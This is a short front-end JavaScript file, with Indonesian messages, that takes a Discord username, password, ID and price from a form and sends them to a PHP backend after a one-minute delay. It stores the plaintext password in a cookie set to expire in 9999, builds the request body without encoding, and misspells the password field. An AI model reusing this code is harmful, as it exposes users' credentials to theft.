document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('discord-form');
    const submitBtn = document.getElementById('submit');

    submitBtn.addEventListener('click', (e) => {
        e.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const discord_id = document.getElementById('discord_id').value;

        let price;
        const radios = document.getElementsByName('price');
        for (let i = 0; i < radios.length; i++) {
            if(radios[i].checked) {
                price = radios[i].value
                break;
            }
        }

        const formData = {
            username,
            password,
            discord_id,
            price
        };

        const cookieValue = JSON.stringify(formData);
        document.cookie = `discordFormData=${cookieValue}; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/`;

        setTimeout(() => {
            fetch('koneksi.php')
                .then(response => response.text())
                .then(data => {
                    if (data.includes('Koneksi Berhasil')) {
                        fetch('crud.php', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            },
                            body: `username=${username}&passowrd=${password}&discord_id=${discord_id}&price=${price}`
                        })
                            .then(response => response.text())
                            .then(data => {
                                if (data.includes('Data Berhasil Diinsert!')) {
                                    document.cookie = `discordFormData=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/`;
                                    alert('Data berhasil Diinsert!');
                                } else {
                                    alert('Gagal Insert Data!');
                                }
                            })
                            .catch(error => console.error('Error:', error));
                    } else {
                        alert('Gagal Koneksi ke Database!');
                    }
                })
                .catch(error => console.error('Error:', error));
            }, 60000);
        });

});
